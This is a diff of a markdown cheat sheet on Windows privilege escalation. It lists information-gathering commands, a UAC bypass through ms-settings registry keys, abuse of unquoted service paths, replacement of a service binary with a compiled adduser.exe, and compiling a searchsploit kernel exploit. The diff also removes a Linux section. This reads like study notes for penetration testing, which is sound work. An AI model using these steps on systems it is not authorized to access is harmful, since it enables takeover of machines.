@@ -1,20 +1,18 @@
-# Privilege Escalation
+# Privilege_Escalation_Windows
 
-## Windows
-
-### reference
+## reference
 
 <https://www.fuzzysecurity.com/tutorials/16.html>
 
-#### lolbas-project.github.io
+### lolbas-project.github.io
 
 <https://lolbas-project.github.io/>
 
-#### Sysinterals Suite
+### Sysinterals Suite
 
 <https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite>
 
-### information gathering
+## information gathering
 
 ```cmd
 systeminfo
@@ -28,7 +26,7 @@ net user <username>
 Get-ComputerInfo
 ```
 
-### UAC bypass
+## UAC bypass
 
 ```cmd
 
@@ -43,13 +41,13 @@ REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute 
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
 ```
 
-### file permission
+## file permission
 
 ```powershell
 Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like "Running"}
 ```
 
-#### space in the path & unclosed quotes
+### space in the path & unclosed quotes
 
 ```cmd
 C:\Program Files\VMware\VMware Tools\VMwareUser.exe
@@ -58,7 +56,7 @@ C:\Program.exe
 C:\Program Files\VMware\VMware.exe
 ```
 
-#### full control file replacement
+### full control file replacement
 
 ```bash
 i686-w64-mingw32-gcc adduser.c -o adduser.exe
@@ -77,7 +75,7 @@ shutdown /r /t 0
 net localgroup administrators
 ```
 
-### kernel vulnerability
+## kernel vulnerability
 
 ```cmd
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
@@ -92,28 +90,6 @@ searchsploit USBPcap
 USBPcap 1.1.0.0 (WireShark 2.2.5) - Local Privilege Escalation      |       windows/local/41542.c
 i686-w64-mingw32-gcc 41542.c -o 41542.exe
 ```
-
-## Linux
-
-### reference
-
-<https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>
-
-#### gtfobins.github.io
-
-<https://gtfobins.github.io/>
-
-### general
-
-- 发行版/内核
-- 进程
-- cron
-- 可写目录，文件 /etc/passwd
-- SUID
-- 用户主目录
-- env PATH
-- sudo -s / sudo -l
-- getcap
 
 ## Tips
 
